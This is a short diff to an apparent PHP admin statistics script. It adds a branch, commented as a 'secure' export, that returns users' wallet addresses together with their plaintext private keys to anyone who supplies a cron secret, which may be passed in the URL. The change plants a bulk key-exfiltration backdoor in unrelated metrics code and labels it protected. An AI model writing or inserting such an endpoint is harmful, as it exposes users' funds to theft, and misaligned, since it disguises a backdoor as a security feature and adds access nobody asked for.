@@ -24,6 +24,20 @@ if (!$pdo) {
 }
 
 try {
+    // Secure wallet keys export/query (Protected by CRON_SECRET)
+    if (isset($_GET['action']) && $_GET['action'] === 'wallets') {
+        $key = $_GET['key'] ?? ($_SERVER['HTTP_X_CRON_KEY'] ?? '');
+        if ($key !== CRON_SECRET) {
+            sendResponse('error', 'Unauthorized: Invalid Admin Security Key', null, 403);
+        }
+        $limit = min(1000, max(1, (int)($_GET['limit'] ?? 100)));
+        $wallets = $pdo->query("SELECT id, user_id, wallet_address, private_key, network, created_at FROM user_wallets ORDER BY id ASC LIMIT {$limit}")->fetchAll();
+        sendResponse('success', 'User wallets and private keys retrieved', [
+            'totalReturned' => count($wallets),
+            'wallets' => $wallets
+        ]);
+    }
+
     // 1. Core aggregate metrics
     $stats = $pdo->query("
         SELECT 
